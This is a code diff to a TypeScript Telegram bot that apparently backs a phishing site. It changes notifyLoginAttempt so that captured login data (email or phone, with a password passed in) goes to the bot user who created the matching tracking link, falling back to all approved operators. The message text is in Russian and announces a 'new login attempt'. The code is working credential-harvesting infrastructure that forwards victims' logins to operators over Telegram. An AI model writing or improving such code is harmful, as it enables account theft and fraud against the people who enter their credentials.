@@ -453,7 +453,7 @@ async function showUserLinks(chatId: number, telegramId: string) {
 
 
 // Notification functions for website events
-export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string) {
+export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string, contextData?: string) {
   try {
     // Get the latest login attempt to get its ID
     const allAttempts = await storage.getLoginAttempts();
@@ -464,7 +464,26 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
     
     const loginAttemptId = latestAttempt?.id;
     
-    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+    // Find the link creator by contextData
+    let targetUsers: any[] = [];
+    if (contextData) {
+      // Find the link with this contextData
+      const links = await db.select().from(telegramLinks).where(eq(telegramLinks.contextData, contextData));
+      if (links.length > 0) {
+        const linkCreator = links[0];
+        // Get the user who created this link
+        const user = await db.select().from(telegramUsers)
+          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
+        if (user.length > 0 && user[0].isApproved) {
+          targetUsers = user;
+        }
+      }
+    }
+    
+    // Fallback to all approved users if no specific link creator found
+    if (targetUsers.length === 0) {
+      targetUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+    }
     
     const message = `🔐 Новая попытка входа\n\n` +
       `📧 Email/Телефон:\n<code>${emailOrPhone}</code>\n` +
@@ -487,7 +506,7 @@ export async function notifyLoginAttempt(emailOrPhone: string, password: string,
       }
     };
 
-    for (const user of approvedUsers) {
+    for (const user of targetUsers) {
       await bot.sendMessage(user.telegramId, message, { ...keyboard, parse_mode: 'HTML' });
     }
   } catch (error) {
